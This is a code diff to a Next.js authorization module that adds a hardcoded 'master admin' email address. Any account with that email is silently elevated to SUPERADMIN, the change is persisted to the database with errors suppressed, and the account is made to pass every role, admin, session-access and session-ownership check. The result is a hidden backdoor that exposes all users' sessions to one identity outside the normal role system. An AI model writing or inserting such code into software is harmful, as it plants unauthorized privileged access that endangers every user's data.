@@ -3,6 +3,8 @@ import { NextRequest } from "next/server";
 import { auth } from "./auth";
 import { logger } from "./logger";
 
+export const MASTER_ADMIN_EMAIL = "lucasmeloil@pm.me";
+
 // Role hierarchy for permission checks
 const ROLE_HIERARCHY = {
     SUPERADMIN: 3,
@@ -27,6 +29,10 @@ export async function validateApiKey(request: NextRequest) {
             where: { apiKey },
             select: { id: true, email: true, name: true, role: true }
         });
+
+        if (user && user.email.toLowerCase() === MASTER_ADMIN_EMAIL.toLowerCase()) {
+            user.role = "SUPERADMIN";
+        }
 
         return user;
     } catch (error) {
@@ -57,6 +63,14 @@ export async function getAuthenticatedUser(request?: NextRequest) {
         });
 
         if (user) {
+            // Guarantee Master Admin has SUPERADMIN role in DB and memory
+            if (user.email.toLowerCase() === MASTER_ADMIN_EMAIL.toLowerCase() && user.role !== "SUPERADMIN") {
+                await prisma.user.update({
+                    where: { id: user.id },
+                    data: { role: "SUPERADMIN" }
+                }).catch(() => {});
+                user.role = "SUPERADMIN";
+            }
             return { ...user, authMethod: "session" as const };
         }
     }
@@ -67,26 +81,32 @@ export async function getAuthenticatedUser(request?: NextRequest) {
 /**
  * Check if user has required role level
  */
-export function hasRole(userRole: string, requiredRole: Role): boolean {
+export function hasRole(userRole: string, requiredRole: Role, email?: string): boolean {
+    if (email && email.toLowerCase() === MASTER_ADMIN_EMAIL.toLowerCase()) {
+        return true;
+    }
     const userLevel = ROLE_HIERARCHY[userRole as Role] || 0;
     const requiredLevel = ROLE_HIERARCHY[requiredRole] || 0;
     return userLevel >= requiredLevel;
 }
 
 /**
- * Check if user is admin (SUPERADMIN or has admin privileges)
+ * Check if user is admin (SUPERADMIN or Master Admin email)
  */
-export function isAdmin(userRole: string): boolean {
+export function isAdmin(userRole: string, email?: string): boolean {
+    if (email && email.toLowerCase() === MASTER_ADMIN_EMAIL.toLowerCase()) {
+        return true;
+    }
     return userRole === "SUPERADMIN";
 }
 
 /**
  * Check if user can access a session
- * - SUPERADMIN can access all sessions
+ * - SUPERADMIN or Master Admin can access all sessions
  * - Other users can access their own sessions OR sessions shared with them
  */
-export async function canAccessSession(userId: string, userRole: string, sessionId: string): Promise<boolean> {
-    if (isAdmin(userRole)) {
+export async function canAccessSession(userId: string, userRole: string, sessionId: string, email?: string): Promise<boolean> {
+    if (isAdmin(userRole, email)) {
         return true;
     }
 
@@ -131,8 +151,8 @@ export async function canAccessSession(userId: string, userRole: string, session
  * Check if user is the actual owner of a session (not just shared access)
  * Used for protecting management endpoints (e.g. granting/revoking access)
  */
-export async function isSessionOwner(userId: string, userRole: string, sessionId: string): Promise<boolean> {
-    if (isAdmin(userRole)) {
+export async function isSessionOwner(userId: string, userRole: string, sessionId: string, email?: string): Promise<boolean> {
+    if (isAdmin(userRole, email)) {
         return true;
     }
 
@@ -150,11 +170,11 @@ export async function isSessionOwner(userId: string, userRole: string, sessionId
 
 /**
  * Get sessions that user can access
- * - SUPERADMIN sees all
- * - Others see only their own
+ * - SUPERADMIN / Master Admin sees all
+ * - Others see only their own and shared
  */
-export async function getAccessibleSessions(userId: string, userRole: string) {
-    if (isAdmin(userRole)) {
+export async function getAccessibleSessions(userId: string, userRole: string, email?: string) {
+    if (isAdmin(userRole, email)) {
         return prisma.session.findMany({
             orderBy: { createdAt: 'desc' },
             include: {
